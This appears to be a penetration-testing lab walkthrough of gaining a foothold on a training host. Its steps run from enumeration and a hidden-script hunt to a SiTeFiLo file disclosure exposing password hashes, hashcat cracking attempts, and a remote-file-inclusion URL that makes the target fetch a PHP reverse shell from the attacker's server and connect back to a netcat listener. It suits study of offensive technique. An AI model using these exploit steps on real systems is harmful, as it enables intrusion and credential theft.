Getting a Foothold

Getting a Foothold

# 1. NMAP Scans
Run a TCP Connect scan for services on all ports. 
`sudo nmap -sV -sT -p- 10.11.1.133`

The output shows only port 80 as open with service name Microsoft IIS 5.6:
![d844c808a666eba0d9f7898e663c2106.png](../../../_resources/47b865843cab408abd1ea3c33c486ea6.png)

Run all the HTTP NSE scripts since the only port open is an http service.
`nmap -Pn -p 80 --script "*http*" 10.11.1.133`

Attached is the output file:
[2020-08-30_214424_nmap_noPing_scripts_http_p80__10.11.1.133.nmap](../../../_resources/4764dac2a5df448988d2e07a2b50b0bf.nmap)


# 2. dirb scan
A non-recursive scan shows directories consistent with Microsoft IIS 5.6 (eg. iissamples directory)
`dirb http://10.11.1.133 -r`
![89b2c130ee3f71bff08362d5d7568543.png](../../../_resources/7baa4f70b7b649f99e20a4c1fd390b42.png)


# 3. Nikto scan 
Output of a default scan mentions CVE-1999-0737. MS99-013.
`nikto -h 10.11.1.133`
![df1c04cc39cf27b5f74a6383cbe79ab6.png](../../../_resources/30f17ded6a16413985996d1a55ac2344.png)


# 4. Exploit MS99-013
*Rabbit Hole!* Tried exploiting the code and looking for a directory traversal using the exploit. Dotdotpwn at first identified a traversal, but I couldn't find it manually on using the browser. **More research on dotdotpwn needed to identify false positives.**
![40bdbd5743e84b4ea6f480f8c62ecaaa.png](../../../_resources/2f177fcf3d7a4984893ba4b8e81f1214.png)


# 5. Netcat UDP port scan 
*Rabbit Hole!* Port 27374 open with the service name 'asp'. There are other open UDP ports, but the 'asp' service name made me continue to treat it as Microsoft IIS 5.6.
`sudo nc -nv -u -z -w 1 10.11.1.133 1-65535`
![51f381e88f6392b46d5f0399f9649933.png](../../../_resources/cfe4b6443cdb4f06ac0d4680816253b8.png)

Tried opening a connection using netcat for port 27374, and also using socat and telnet, but no response.

# 6. View source code on every page that was found by brute force (ie. dirb) 
There is a reference to `hidd3n-script` but no other code. Didn't know what to do with that at this time.
[view-source:http://10.11.1.133/test.asp](view-source:http://10.11.1.133/test.asp)
![bf78413db4b6f13732fdbdd210c3dc76.png](../../../_resources/d31a293c385c44649b270029cec18379.png)


# 7. netcat into port 80 document root
We see that at the end of the output it says **Bad Ph33r**.
`nc -nv 10.11.1.133 80`
![2c8aaf393b7303126d3e8f989c928c95.png](../../../_resources/7ef2a6d415ba44c5a6ade0b71c05268f.png)

But why doesn't it have status 400 instead of 200? After some research, the solution is to change the user-agent to curl. I forgot the link I used but we would've known to try a different user agent by looking at NMAP's http-user-agent-test script results. Notice that **libcurl-agent/1.0** has status 200
![1e0143dc22380a6e8a7ac5993508306d.png](../../../_resources/34d997780b964371b9ee98543a6362f8.png)

Try to netcat the document root again, and we see this time it's status 200:
`printf "GET / HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![1150e466ded152073e248376596f55d0.png](../../../_resources/d62b9318ea4248a4a312e6d4ae209b41.png)


# 8. Try to netcat the /test.asp directory
Using the libcurl-agent/1.0 browser useragent string, we get status 200
`printf "GET /test.asp HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![d79001b085c6f1d0a5513edc955257a6.png](../../../_resources/d1e623ab02b6489f843168d0c6cbcb87.png)


# 9. Perhaps hidd3n-script is a directory... yes it is!
Using the libcurl-agent/1.0 browser useragent string, we get status 200. Aha! Here is the hidd3n-script:
`printf "GET /hidd3n-script HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![fbbd2ad9f58747900555895569fec565.png](../../../_resources/d1a4a3cb4bfc499fa74cb02cb6bfcb2b.png)


# 10. Deobfuscate hidd3n-script
I tried to beautify the code online, but those kept removing the var_0x5490 variable at the beginning of the script. I ended up manually replacing all the hex values myself using this website
[https://www.rapidtables.com/convert/number/hex-to-ascii.html](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

How do I know it's JavaScript code? Google kept showing me search hits of the code (others have posted it on the web), all of which was javascript

Here is the deobfuscated code:
[hidd3n-script](../../../_resources/5b3ec7c808234dbeb00707cd8b27f368.133hidd3)
![35778966b1e11111019beb6213967ad1.png](../../../_resources/7e720b3381fd4945bd3441e6da451b04.png)


# 11. Understand what hidd3n-script is doing 
It specifies that the hidd3n-script is here:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/)
![201b0f115b6269afe32071bd0e6e05f6.png](../../../_resources/97daf9567ed840c1b671ed252271ff43.png)


# 12. How deep is the rabbit hole? Perhaps there are more nested directories or files... Yes there are!
From hidd3n-script, there are image files that we haven't seen yet. They are found in the directory.

Here is offsecphun1.gif:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun1.gif](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun1.gif)
![e049d92e76cdd7170de3ea0fb27ae662.png](../../../_resources/bc4b76b227354ea4a76574c310261d87.png)

Here is offsecphun2.png:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun2.png](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun2.png)
![fe96ee28fb0e6e1e30257a4954cdb0e2.png](../../../_resources/2bf654b76c4f4908952f19daa968924e.png)


# 13. Don't forget offsecphun5.bmp
Here is offsecphun5.bmp
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun5.bmp](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun5.bmp)

When we input it into the browser it redirects us to an image in another directory:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg)
![baf5ab1461fbe4a1a2f32378f6618ec8.png](../../../_resources/cea7dbd479054f8082b4ee31d1b33a83.png) 


# 14. Check what else may be listed in the 111111111 dir.
We find a login page:
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/`
![ec6828a95c3a2c6f5e90eb54d17e4ac0.png](../../../_resources/a1b92b3eef8346c58091cab6e10ee6a6.png)

The source code:
![202a7570a9808c5da5f8a4a5480b0a52.png](../../../_resources/cc0166f3545946a9ac082b00e8df4353.png)


# 15. Research 'slogin'
## Searchsploit
No info found via on searchsploit:
`searchsploit slogin`
![c44b430e89c35bca07cf779e60e3713d.png](../../../_resources/3e16d497144245f1aeeb4f64dfacd887.png)

## Google search of slogin_POST_username
We find a better search term: **SiTeFiLo**
![a625d0cc5faea33df70b86a204e8a23d.png](../../../_resources/8db3c28dc4634e1a8c7ce996d4d2654e.png)

## Searchsploit (again)
This time we find a hit
`searcshploit sitefilo`
![80a9969f1336663627df41825dceb106.png](../../../_resources/7f161af95326474485dab2139fae9ed2.png)

Download the sitefilo exploit. Exploit 7444.txt contains 2 exploits: a file disclosure and an RFI
`searchsploit -m 7444`
![542078efd8690973c62a9936426c0f5e.png](../../../_resources/61a98c4f53474b6bb06386af17c4d16c.png)


# 16. Check if file disclosure works on 7444.txt exploit.
![ee2c6fa334814140d134ce8e1e8c3c09.png](../../../_resources/859a45224a77411985f8f7de9e2a28e2.png)

The slog_users.txt is there and reveals some credentials
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slog_users.txt`
![3b8c9d60c01287d3859081c99a3f1b5e.png](../../../_resources/3ffd3379c8a74322ac93300240b338bd.png)

# 17. Attempt to crack the hashes - FAILED
### Online
[https://crackstation.net/](https://crackstation.net/)
![7cd741e041594d59d2a59413f1107a80.png](../../../_resources/cf1980c6525346c9b3e2f123f331233e.png)

### Hashcat
`hashcat hashes.txt /usr/share/wordlists/rockyou.txt --force`
![4fb41e625d3e2306b1055d669adc8a34.png](../../../_resources/02c1d56ab31a4f72abf834e4d30ec981.png)


# 18. Check if RFI works on 7444.txt exploit. 
**[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]**
![cc7a73edde7ba780815ee253f8e0aefc.png](../../../_resources/7b9fdcb2b11a4d4da2f992fae7f5f2eb.png)

## Confirm if slogin_lib.inc.php exists... yes it does
### Navigate to the site on a browser
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php)
![e7d83b3f0b51d5358ef0a5bc596780d3.png](../../../_resources/4c4024bf825e44b6a8c2ecfb16d04c03.png)

### Confirm via netcat
`printf "GET /1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![bcea3ba9bdd26e285fe023834eb9ee9f.png](../../../_resources/47d72ee0f0354584856aae9d3689288d.png)

## Pick a reverse shell, and modify it to use your attack machine's IP and listening port if necessary.
The shell that works is the one located at:
`/usr/share/webshells/php/php-reverse-shell.php`

Modify it to use the attack machine IP and listening port of your choice.
In this example, attack machine IP=192.168.119.214, and listening port=5678
![587522803fbbe139b4082898d51d4259.png](../../../_resources/ba19604766634d2fa09b9306c1e7f46f.png)

*Note* I had also tried a jsp reverse shell, but it didn't work.
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/jsp-reverse.jsp?`
![3a7c3b93808a5ee619abd24e63cb4121.png](../../../_resources/9771fc9d775d419f9b9120786c4e5915.png)

## Serve the reverse-shell.php file
Stop the apache2 service if necessary
`sudo systemctl stop apache2`

Navigate to the directory where reverse-shell.php is, then start a python server on port 80
`sudo python -m SimpleHTTPServer 80`
![bc6190236deda6266c4beceac888daec.png](../../../_resources/6aa045518edb451b9eddf9a6bfeefc2f.png)

## Start a netcat listener on port 5678
`sudo nc -lvnp 5678`
![ca964cc68bbc1929ccc5d97616c7e71d.png](../../../_resources/1689bce41e074acbaf1ec39414dbb602.png)

## Browse to:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/php-reverse-shell.php?](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/php-reverse-shell.php?)

![d18e4fac5b75d50b737e615a5bbed2db.png](../../../_resources/0b0ca45d6aa44d35935ad3114ef10901.png)

## Observe the netcat listener now shows a shell!
![fcd35a459b50d504bcc6de7050423669.png](../../../_resources/fcef5d47f09c4f1d83365641fa5d5980.png)





